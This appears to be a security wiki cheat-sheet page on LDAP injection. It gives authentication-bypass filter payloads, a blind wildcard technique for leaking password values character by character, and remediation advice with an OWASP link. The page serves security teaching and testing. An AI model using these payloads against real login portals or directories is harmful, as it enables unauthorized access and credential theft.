---
tags:
  - Web
---

# :material-account-search: LDAP Injection

<span class="pill pill-medium">niche</span> <span class="pill pill-info">web</span>

Apps that authenticate against a directory build LDAP filters from input. Inject filter syntax and you rewrite the match — classic on intranet portals and appliances.

!!! abstract "TL;DR"
    LDAP filters look like `(&(user=X)(pass=Y))`. Inject `*` and `)(` to turn the filter always-true or to enumerate the tree.

## :material-login: Auth bypass

```text
user = *)(uid=*))(|(uid=*     pass = anything
user = admin)(&))             pass = anything
user = *                      pass = *
```

The wildcard `*` matches any value; the injected parenthesis closes the password check.

## :material-magnify: Blind enumeration

Use the wildcard as a boolean oracle to leak attribute values char-by-char:

```text
(&(uid=admin)(password=a*))   -> valid login? password starts with 'a'
(&(uid=admin)(password=ab*))  -> narrow it down
```

## :material-shield-check: Remediation

- Escape LDAP special characters (`* ( ) \ NUL`) per RFC 4515 before building filters.
- Use parameterized directory APIs and a least-privilege bind account.

## :material-link-variant: Related

- Same always-true logic as [SQL Injection](sqli.md) and [NoSQL Injection](nosql-injection.md).
- Directory creds pivot straight into [Active Directory](../network/active-directory.md).
- Reference: [OWASP LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection).
